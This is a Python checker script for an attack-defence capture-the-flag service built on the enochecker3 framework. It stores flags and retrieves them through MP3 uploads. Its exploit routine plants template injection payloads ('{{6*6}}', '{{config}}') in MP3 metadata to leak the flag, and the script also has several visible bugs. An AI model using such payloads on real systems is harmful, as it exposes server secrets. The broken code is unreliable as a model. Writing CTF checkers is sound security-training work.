"""
CHECKER FUNCTIONS
"""
import enochecker3
import secrets
from typing import Optional

from httpx import AsyncClient

from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
import mp3_helper
import utils
import faker
from logging import LoggerAdapter


FAKER = faker.Faker(faker.config.AVAILABLE_LOCALES)
checker = Enochecker("t3chn0r4d10", 8001)
app = lambda: checker.app

password = secrets.token_hex(16)
username = "admin"


@checker.putflag(0)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    # Second file is in config which gets loaded from a file
    # Creates a malicious mp3 file named "exploit.mp3"
    mp3_helper.create_mp3("admin.mp3")
    mp3_helper.create_malicious_file("admin.mp3", "Flag", "FindMe", "Techno")
    url = utils.register_user_and_login("")
    # Try to upload mp3 to page
    with open("admin", "rb+") as file:
        # Write flag in last bytes
        file.seek(-len(task.flag), 2)
        new_bytes = task.flag
        file.write(new_bytes)

        files = {"file": file}
        headers = {"Content-Type": "audio/mpeg"}

        response = client.post(url, files=files, headers=headers)

        if response.status_code == 200:
            print("File upload successful!")
        else:
            raise MumbleException("Upload failed")


@checker.getflag(0)
async def getflag_test(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # login and check that file exists
    url = utils.login(client, username, password)
    response = client.get(url.replace("home", "UPLOAD_FOLDER/admin.mp3"))
    # Find flag in response text
    assert_equals(response.status_code, 200, "Didn't find file")
    if task.flag not in response.text:
        raise MumbleException("Flag receiving failed. Not sent by server")


@checker.exploit(0)
async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # Creates a malicious mp3 file named "exploit.mp3"
    mp3_helper.create_mp3("exploit.mp3")
    mp3_helper.create_malicious_file("exploit.mp3", "{{6*6}}", "{{config}}", "Techno")
    # TODO add logger
    # register
    url = utils.register_user_and_login(client, "eve", "IamAliceISwear")
    file_path = "./exploit.mp3"
    # Try to upload mp3 to page
    with open(file_path, "rb") as file:
        files = {"file": file}
        headers = {"Content-Type": "audio/mpeg"}

        response = client.post(url, files=files, headers=headers)

        if response.status_code == 200:
            print("File upload successful!")
        else:
            raise MumbleException("Upload failed")

    # Find flag in response text
    if flag := searcher.search_flag(response.text):
        return flag


@checker.putflag(1)
async def putflag_test(
    task: PutflagCheckerTaskMessage,
    client: AsyncClient,
    db: ChainDB,
) -> None:
    # First Flag Connect to DB and add a flag
    return


@checker.getflag(1)
async def getflag_test(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    return


@checker.exploit(1)
async def exploit_test(searcher: FlagSearcher, client: AsyncClient) -> Optional[str]:
    # sql injection for now pass it
    return
